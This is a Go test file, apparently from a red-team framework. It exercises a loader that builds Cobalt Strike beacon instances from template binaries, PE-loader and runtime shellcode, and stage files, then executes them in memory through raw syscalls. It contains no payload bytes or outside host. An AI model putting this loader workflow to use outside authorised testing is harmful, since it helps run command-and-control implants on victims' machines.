package beacon

import (
	"encoding/hex"
	"fmt"
	"os"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/RTS-Framework/GRT-Develop/argument"
	"github.com/RTS-Framework/GRT-Develop/instance"
	"github.com/RTS-Framework/GRT-MXLoader/loader"
	"github.com/RTS-Framework/GRT-MXLoader/loader/xsyscall"
)

func TestCreateInstance(t *testing.T) {
	image := loader.NewFile("stage.dat")

	t.Run("x86", func(t *testing.T) {
		inst, err := CreateInstance("386", image, nil)
		require.NoError(t, err)
		require.NotNil(t, inst)
	})

	t.Run("x64", func(t *testing.T) {
		inst, err := CreateInstance("amd64", image, nil)
		require.NoError(t, err)
		require.NotNil(t, inst)
	})

	t.Run("custom template", func(t *testing.T) {
		template, err := os.ReadFile("../../dist/standard/CS_Beacon_x86.bin")
		require.NoError(t, err)
		opts := Options{
			Template: template,
		}

		inst, err := CreateInstance("386", image, &opts)
		require.NoError(t, err)
		require.NotNil(t, inst)
	})

	t.Run("ignore instantiate options", func(t *testing.T) {
		template, err := os.ReadFile("../../dist/pipeline/CS_Beacon_x86.bin")
		require.NoError(t, err)
		opts := Options{
			Template:       template,
			IgnoreInstOpts: true,
		}

		inst, err := CreateInstance("386", image, &opts)
		require.NoError(t, err)
		require.NotNil(t, inst)
	})

	t.Run("with additional arguments", func(t *testing.T) {
		t.Run("common", func(t *testing.T) {
			args := []*argument.Arg{
				{ID: 100, Data: []byte("config data")},
			}
			opts := Options{
				Arguments: args,
			}

			inst, err := CreateInstance("386", image, &opts)
			require.NoError(t, err)
			require.NotNil(t, inst)
		})

		t.Run("invalid id", func(t *testing.T) {
			args := []*argument.Arg{
				{ID: 1, Data: []byte("config data")},
			}
			opts := Options{
				Arguments: args,
			}

			inst, err := CreateInstance("386", image, &opts)
			errStr := "additional argument id must greater than 64"
			require.EqualError(t, err, errStr)
			require.Nil(t, inst)
		})
	})

	t.Run("invalid version", func(t *testing.T) {
		opts := Options{
			Version: "invalid",
		}

		inst, err := CreateInstance("386", image, &opts)
		errStr := "failed to encode beacon version: invalid version format: invalid"
		require.EqualError(t, err, errStr)
		require.Nil(t, inst)
	})

	t.Run("invalid payload", func(t *testing.T) {
		opts := loader.EmbedOptions{
			Compress:   true,
			WindowSize: 40960,
		}
		embed := loader.NewEmbed([]byte{0x00}, &opts)

		inst, err := CreateInstance("386", embed, nil)
		errStr := "invalid embed mode config: failed to compress payload: invalid window size"
		require.EqualError(t, err, errStr)
		require.Nil(t, inst)
	})

	t.Run("invalid architecture", func(t *testing.T) {
		inst, err := CreateInstance("123", image, nil)
		require.EqualError(t, err, "invalid architecture: 123")
		require.Nil(t, inst)
	})

	t.Run("invalid template", func(t *testing.T) {
		opts := Options{
			Template: []byte{0x00},
		}

		inst, err := CreateInstance("386", image, &opts)
		require.EqualError(t, err, "invalid runtime template")
		require.Nil(t, inst)
	})

	t.Run("same argument id", func(t *testing.T) {
		args := []*argument.Arg{
			{ID: 100, Data: []byte("config data 1")},
			{ID: 100, Data: []byte("config data 2")},
		}
		opts := Options{
			Arguments: args,
		}

		inst, err := CreateInstance("386", image, &opts)
		errStr := "failed to encode argument: argument id 100 already exists"
		require.EqualError(t, err, errStr)
		require.Nil(t, inst)
	})
}

func TestInstance_Standard(t *testing.T) {
	if runtime.GOOS != "windows" {
		return
	}

	t.Run("x86", func(t *testing.T) {
		if runtime.GOARCH != "386" {
			return
		}

		t.Run("embed", func(t *testing.T) {
			stage, err := os.ReadFile("testdata/stage_x86.dat")
			require.NoError(t, err)
			payload := loader.NewEmbed(stage, nil)

			inst, err := CreateInstance("386", payload, nil)
			require.NoError(t, err)

			testLoadInstance(t, inst)
		})

		t.Run("file", func(t *testing.T) {
			payload := loader.NewFile("testdata/stage_x86.dat")

			inst, err := CreateInstance("386", payload, nil)
			require.NoError(t, err)

			testLoadInstance(t, inst)
		})

		t.Run("http", func(t *testing.T) {

		})
	})

	t.Run("x64", func(t *testing.T) {
		if runtime.GOARCH != "amd64" {
			return
		}

		t.Run("embed", func(t *testing.T) {
			stage, err := os.ReadFile("testdata/stage_x64.dat")
			require.NoError(t, err)
			payload := loader.NewEmbed(stage, nil)

			inst, err := CreateInstance("amd64", payload, nil)
			require.NoError(t, err)

			testLoadInstance(t, inst)
		})

		t.Run("file", func(t *testing.T) {
			payload := loader.NewFile("testdata/stage_x64.dat")

			inst, err := CreateInstance("amd64", payload, nil)
			require.NoError(t, err)

			testLoadInstance(t, inst)
		})

		t.Run("http", func(t *testing.T) {

		})
	})
}

func TestInstance_Pipeline(t *testing.T) {
	if runtime.GOOS != "windows" {
		return
	}

	t.Run("x86", func(t *testing.T) {
		if runtime.GOARCH != "386" {
			return
		}

		stage, err := os.ReadFile("testdata/stage_x86.dat")
		require.NoError(t, err)
		payload := loader.NewEmbed(stage, nil)

		opts := Options{
			Template:       testBuildTemplate(t),
			IgnoreInstOpts: true,
		}

		inst, err := CreateInstance("386", payload, &opts)
		require.NoError(t, err)

		testLoadInstance(t, inst)
	})

	t.Run("x64", func(t *testing.T) {
		if runtime.GOARCH != "amd64" {
			return
		}

		stage, err := os.ReadFile("testdata/stage_x64.dat")
		require.NoError(t, err)
		payload := loader.NewEmbed(stage, nil)

		opts := Options{
			Template:       testBuildTemplate(t),
			IgnoreInstOpts: true,
		}

		inst, err := CreateInstance("amd64", payload, &opts)
		require.NoError(t, err)

		testLoadInstance(t, inst)
	})
}

func testBuildTemplate(t *testing.T) []byte {
	var (
		boot []byte
		ldr  []byte
		rti  []byte
		err  error
	)
	switch runtime.GOARCH {
	case "386":
		boot, err = os.ReadFile("../../dist/pipeline/CS_Beacon_x86.bin")
		require.NoError(t, err)
		ldr, err = os.ReadFile("../../asm/inst/pe_loader_x86.inst")
		require.NoError(t, err)
		rti, err = os.ReadFile("../../asm/inst/runtime_x86.inst")
		require.NoError(t, err)
	case "amd64":
		boot, err = os.ReadFile("../../dist/pipeline/CS_Beacon_x64.bin")
		require.NoError(t, err)
		ldr, err = os.ReadFile("../../asm/inst/pe_loader_x64.inst")
		require.NoError(t, err)
		rti, err = os.ReadFile("../../asm/inst/runtime_x64.inst")
		require.NoError(t, err)
	default:
		t.Fatal("unsupported architecture")
	}
	ldr = testInstToBin(t, ldr)
	rti = testInstToBin(t, rti)

	instOpts := instance.Options{
		SkipArguments: true,
	}
	rti, err = instance.Instantiate(rti, &instOpts)
	require.NoError(t, err)

	template, err := loader.BuildTemplate(boot, ldr, rti)
	require.NoError(t, err)
	return template
}

func testInstToBin(t *testing.T, i []byte) []byte {
	s := string(i)
	s = strings.ReplaceAll(s, ",", "")
	s = strings.ReplaceAll(s, " 0", "")
	s = strings.ReplaceAll(s, "db", "")
	s = strings.ReplaceAll(s, "h", "")
	s = strings.ReplaceAll(s, " ", "")
	s = strings.ReplaceAll(s, "\r\n", "")
	bin, err := hex.DecodeString(s)
	require.NoError(t, err)
	return bin
}

func testLoadInstance(t *testing.T, inst []byte) {
	now := time.Now()

	addr := xsyscall.LoadInstance(t, inst)
	ret, _, _ := xsyscall.SyscallN(addr, 0)
	require.Zero(t, ret, fmt.Sprintf("0x%X", ret))

	d := time.Since(now)
	require.Greater(t, d, time.Second)
}
